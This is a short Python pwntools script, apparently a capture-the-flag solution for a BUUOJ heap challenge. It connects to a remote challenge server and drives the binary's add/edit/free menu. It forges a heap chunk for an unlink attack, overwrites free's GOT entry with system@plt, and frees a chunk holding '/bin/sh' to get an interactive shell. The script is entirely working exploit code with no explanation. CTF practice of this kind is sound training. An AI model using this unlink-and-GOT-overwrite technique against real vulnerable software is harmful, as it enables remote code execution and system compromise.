from pwn import *

io=remote('node3.buuoj.cn',25111)

def add(size,data):
    io.recvuntil('choice :')
    io.sendline('1')
    io.recvuntil('Heap : ')
    io.sendline(str(size))
    io.recvuntil('heap:')
    io.send(data)

def edit(idx,size,data):
    io.recvuntil('choice :')
    io.sendline('2')
    io.recvuntil('Index :')
    io.sendline(str(idx))
    io.recvuntil('Heap : ')
    io.sendline(str(size))
    io.recvuntil('heap :')
    io.send(data)

def free(idx):
    io.recvuntil('choice :')
    io.sendline('3')
    io.recvuntil('Index :')
    io.sendline(str(idx))


free_got=0x0602018
sys_plt=0x0400700

ptr=0x6020E0+0x10

add(0x30,'a')#0
add(0x30,'b')#1
add(0x30,'c')#2
add(0x80,'d')#3
add(0x60,'/bin/sh')#4

edit(2,0x100,p64(0)+p64(0x31)+p64(ptr-0x18)+p64(ptr-0x10)+'a'*0x10+p64(0x30)+p64(0x90))
free(3)
edit(2,0x100,p64(free_got)*2)
edit(0,0x100,p64(sys_plt))

io.interactive()